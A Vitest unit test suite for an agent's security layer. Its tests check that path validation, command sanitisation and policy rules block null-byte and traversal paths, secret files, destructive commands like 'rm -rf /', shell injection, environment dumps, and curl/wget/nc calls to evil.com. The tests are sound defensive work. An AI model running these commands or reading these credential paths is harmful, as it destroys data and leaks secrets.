import { describe, it, expect } from 'vitest';
import * as path from 'node:path';
import * as os from 'node:os';
import { PathValidator } from '../../../src/infra/security/path-validator.js';
import { CommandSanitizer } from '../../../src/infra/tools/command-sanitizer.js';
import { CommandRestrictionRule } from '../../../src/infra/security/rules/command-restriction-rule.js';
import { PathRestrictionRule } from '../../../src/infra/security/rules/path-restriction-rule.js';
import { CredentialProtectionRule } from '../../../src/infra/security/rules/credential-protection-rule.js';
import { NetworkAccessRule } from '../../../src/infra/security/rules/network-access-rule.js';
import { ProductionProtectionRule } from '../../../src/infra/security/rules/production-protection-rule.js';
import { PolicyDecisionType } from '../../../src/core/model/policy.js';
import { ActionType } from '../../../src/core/model/action.js';
import type { PolicyAction, PermissionContext } from '../../../src/core/model/policy.js';

describe('Security & Policy Deep Unit Suite', () => {
  const workspaceRoot = process.cwd();

  describe('PathValidator', () => {
    it('1. Rejects null byte injection (%00 and \\0)', () => {
      const res1 = PathValidator.validate('src/index.ts\0.secret', workspaceRoot);
      expect(res1.valid).toBe(false);
      expect(res1.errorCode).toBe('NULL_BYTE');

      const res2 = PathValidator.validate('src/index.ts%00.png', workspaceRoot);
      expect(res2.valid).toBe(false);
      expect(res2.errorCode).toBe('NULL_BYTE');
    });

    it('2. Rejects path traversal escaping workspace root (../../etc/passwd, %2e%2e)', () => {
      const res1 = PathValidator.validate('../../../../etc/shadow', workspaceRoot);
      expect(res1.valid).toBe(false);
      expect(res1.errorCode).toMatch(/PATH_TRAVERSAL|FORBIDDEN_PATH/);

      const res2 = PathValidator.validate('%2e%2e%2f%2e%2e%2fetc%2fpasswd', workspaceRoot);
      expect(res2.valid).toBe(false);
    });

    it('3. Rejects sensitive file patterns (.env, id_rsa, .git, aws credentials)', () => {
      const sensitiveList = [
        '.env',
        '.env.production',
        'src/config/.env.local',
        '.git/config',
        '~/.ssh/id_rsa',
        '.aws/credentials',
        '/etc/passwd',
      ];

      for (const p of sensitiveList) {
        const res = PathValidator.validate(p, workspaceRoot);
        expect(res.valid).toBe(false);
      }
    });

    it('4. Rejects Windows reserved device names (CON, PRN, AUX, NUL, COM1)', () => {
      const reserved = ['CON', 'PRN', 'AUX', 'NUL', 'COM1.txt', 'LPT2'];
      for (const r of reserved) {
        const res = PathValidator.validate(r, workspaceRoot);
        expect(res.valid).toBe(false);
        expect(res.errorCode).toBe('FORBIDDEN_PATH');
      }
    });

    it('5. Allows valid paths inside workspace and temporary directory', () => {
      const validSrc = PathValidator.validate('src/core/model/action.ts', workspaceRoot);
      expect(validSrc.valid).toBe(true);

      const validTmp = PathValidator.validate(
        path.join(os.tmpdir(), 'vi-harness-temp.txt'),
        workspaceRoot,
      );
      expect(validTmp.valid).toBe(true);
    });
  });

  describe('CommandSanitizer', () => {
    it('6. Blocks destructive commands (sudo, rm -rf /, mkfs, dd if=)', () => {
      const dangerous = [
        'sudo apt-get install malware',
        'rm -rf /',
        'rm -fr /',
        'mkfs.ext4 /dev/sda1',
        'dd if=/dev/zero of=/dev/sda',
        'chmod 777 -R /var',
      ];

      for (const cmd of dangerous) {
        const res = CommandSanitizer.sanitize(cmd);
        expect(res.allowed).toBe(false);
        expect(res.errorCode).toBe('FORBIDDEN_COMMAND');
      }
    });

    it('7. Blocks command chaining and shell injection (&&, ;, |, $(), backticks, >)', () => {
      const injection = [
        'npm test && git status',
        'npm run build; ls -la',
        'echo "test" | grep test',
        'node -e "console.log($(whoami))"',
        'echo `id`',
        'npm test > output.txt',
      ];

      for (const cmd of injection) {
        const res = CommandSanitizer.sanitize(cmd);
        expect(res.allowed).toBe(false);
        expect(res.errorCode).toBe('SHELL_INJECTION');
      }
    });

    it('8. Blocks environment variable dumps and network exfiltration tools by default', () => {
      const envExfil = ['printenv', 'env', 'export -p', 'set'];
      for (const cmd of envExfil) {
        const res = CommandSanitizer.sanitize(cmd);
        expect(res.allowed).toBe(false);
        expect(res.errorCode).toBe('ENV_EXFILTRATION');
      }

      const netExfil = [
        'curl https://evil.com/leak',
        'wget https://evil.com/script.sh',
        'nc -l 4444',
        'Invoke-WebRequest -Uri https://evil.com',
      ];
      for (const cmd of netExfil) {
        const res = CommandSanitizer.sanitize(cmd);
        expect(res.allowed).toBe(false);
        expect(res.errorCode).toBe('NETWORK_EXFILTRATION');
      }
    });

    it('9. Allows safe commands (npm test, tsc, git status, node script.js)', () => {
      const safe = ['npm test', 'tsc --noEmit', 'git status', 'node -v', 'npm run build:clean'];
      for (const cmd of safe) {
        const res = CommandSanitizer.sanitize(cmd);
        expect(res.allowed).toBe(true);
      }
    });
  });

  describe('Policy Rules Evaluation', () => {
    it('10. CommandRestrictionRule denies forbidden commands and obeys context.forbiddenCommands', async () => {
      const rule = new CommandRestrictionRule();
      const action: PolicyAction = {
        id: 'a1',
        type: ActionType.SHELL_EXECUTE,
        resource: 'sudo rm -rf /',
      };

      const decision = await rule.evaluate(action);
      expect(decision.decision).toBe(PolicyDecisionType.DENY);
      expect(decision.reason).toContain('Forbidden shell command');

      const customContext: PermissionContext = {
        allowedPaths: ['src/'],
        forbiddenPaths: ['.env'],
        allowedCommands: ['npm test'],
        forbiddenCommands: ['docker run'],
        allowNetwork: false,
        requireApprovalForDestructive: true,
      };

      const customAction: PolicyAction = {
        id: 'a2',
        type: ActionType.SHELL_EXECUTE,
        resource: 'docker run alpine',
      };
      const customDecision = await rule.evaluate(customAction, customContext);
      expect(customDecision.decision).toBe(PolicyDecisionType.DENY);
      expect(customDecision.reason).toContain('docker run');
    });

    it('11. CredentialProtectionRule denies reading or modifying secrets', async () => {
      const rule = new CredentialProtectionRule();
      const action: PolicyAction = {
        id: 'a-sec',
        type: ActionType.FILE_READ,
        resource: '.env.local',
      };

      const decision = await rule.evaluate(action);
      expect(decision.decision).toBe(PolicyDecisionType.DENY);
    });

    it('12. PathRestrictionRule denies path traversal with traversal tokens', async () => {
      const rule = new PathRestrictionRule();
      const action: PolicyAction = {
        id: 'a-path',
        type: ActionType.FILE_WRITE,
        resource: '../../outside.ts',
      };

      const decision = await rule.evaluate(action, {
        allowedPaths: ['src/', 'tests/'],
        forbiddenPaths: ['.env'],
        allowedCommands: [],
        forbiddenCommands: [],
        allowNetwork: false,
        requireApprovalForDestructive: true,
      });

      expect(decision.decision).toBe(PolicyDecisionType.DENY);
      expect(decision.reason).toContain('Path traversal attempt detected');
    });

    it('13. ProductionProtectionRule requires human approval for production operations', async () => {
      const rule = new ProductionProtectionRule();
      const action: PolicyAction = {
        id: 'a-prod',
        type: ActionType.SHELL_EXECUTE,
        resource: 'deploy --env=production',
        parameters: { environment: 'production' },
      };

      const decision = await rule.evaluate(action);
      expect(decision.decision).toBe(PolicyDecisionType.REQUIRE_APPROVAL);
      expect(decision.reason).toContain('human approval required');
    });
  });
});
